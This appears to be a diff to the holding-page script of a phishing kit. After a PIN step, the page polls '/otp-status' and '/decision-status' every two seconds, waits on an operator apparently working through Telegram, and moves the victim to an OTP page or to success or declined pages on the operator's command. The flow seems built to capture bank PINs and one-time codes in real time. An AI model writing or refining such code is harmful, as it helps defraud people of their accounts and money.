@@ -27,27 +27,49 @@
 <div class="footer"></div>
 
 <script>
-
-// FLOW A: STEP4 → STEP5
+// ===============================
+// FIRST → GO TO PIN PAGE
+// ===============================
 if (localStorage.getItem("firstProcess") === "yes") {
-
     localStorage.removeItem("firstProcess");
 
     setTimeout(() => {
         window.location.href = "step5.html";
-    }, 3000);
+    }, 5000);
 }
 
-// ===== FLOW B: AFTER PIN → WAIT FOR TELEGRAM =====
+// ===============================
+// SECOND → WAIT FOR TELEGRAM
+// ===============================
 if (localStorage.getItem("fromPin") === "yes") {
 
-  
-    localStorage.removeItem("fromPin");
-    setTimeout(() => {
-    window.location.href = "step6.html";
-}
-        2000);  
+    setInterval(() => {
 
+        // 🔹 CHECK OTP
+        fetch("/otp-status")
+        .then(res => res.json())
+        .then(data => {
+            if (data.otp === 5 || data.otp === 6) {
+                localStorage.setItem("otpLength", data.otp);
+                localStorage.removeItem("fromPin");
+                window.location.href = "step6.html";
+            }
+        });
+
+        // 🔹 CHECK DECISION
+        fetch("/decision-status")
+        .then(res => res.json())
+        .then(data => {
+            if (data.decision === "accept") {
+                window.location.href = "success.html";
+            }
+
+            if (data.decision === "decline") {
+                window.location.href = "declined.html";
+            }
+        });
+
+    }, 2000);
 }
 </script>
 
